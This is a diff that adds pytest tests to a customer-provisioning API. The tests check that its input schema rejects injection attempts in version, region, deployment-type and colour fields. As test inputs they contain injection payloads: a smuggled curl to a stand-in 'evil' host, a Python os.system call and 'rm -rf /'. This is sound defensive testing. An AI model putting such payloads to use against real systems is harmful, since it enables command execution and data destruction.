@@ -517,3 +517,56 @@ def test_retry_rejects_non_failed_provisioning_run(monkeypatch):
 
     assert exc.value.status_code == 409
     assert len(runs.list_runs()) == 1
+
+
+# --- workflow-injection hardening -------------------------------------------
+
+def test_provision_create_rejects_shell_injection_in_module_versions():
+    """A module version like "1.0'; curl evil #" must be rejected at the schema
+    boundary so it can never reach the provision-customer workflow's shell/python
+    interpolation (the job holds RAILWAY_TOKEN + the callback key)."""
+    import pydantic
+
+    with pytest.raises(pydantic.ValidationError):
+        provisioning_router.CustomerProvisionCreate(
+            customer_name="x",
+            module_versions={"assistant-service": "1.0'; curl https://evil #"},
+        )
+
+
+def test_provision_create_rejects_injection_in_structural_fields():
+    import pydantic
+
+    for field, bad in [
+        ("deployment_type", '"+__import__("os").system("x")+"'),
+        ("initial_version", "1.0\nrm -rf /"),
+        ("region", "us'; touch pwned #"),
+    ]:
+        with pytest.raises(pydantic.ValidationError):
+            provisioning_router.CustomerProvisionCreate(customer_name="x", **{field: bad})
+
+
+def test_provision_create_rejects_injection_in_brand_colors():
+    import pydantic
+
+    with pytest.raises(pydantic.ValidationError):
+        provisioning_router.CustomerProvisionCreate(
+            customer_name="x",
+            brand_theme=provisioning_router.BrandThemeInput(primary_color="#000'; evil #"),
+        )
+
+
+def test_provision_create_accepts_legitimate_values():
+    """The hardening must not reject normal versions, slugs, module maps, or hex
+    colors (customer/brand names remain free text and are intentionally allowed)."""
+    ok = provisioning_router.CustomerProvisionCreate(
+        customer_name="O'Brien Gym & Co",  # free-text name: quotes/space/& allowed
+        deployment_type="dedicated_railway",
+        region="europe-west1",
+        initial_version="2026.07.0",
+        current_migration="0015_fleet_telemetry",
+        module_versions={"communication-api": "1.2.0", "assistant-service": "0.9.1"},
+        brand_theme=provisioning_router.BrandThemeInput(primary_color="#16191e"),
+    )
+    assert ok.customer_name == "O'Brien Gym & Co"
+    assert ok.module_versions["communication-api"] == "1.2.0"
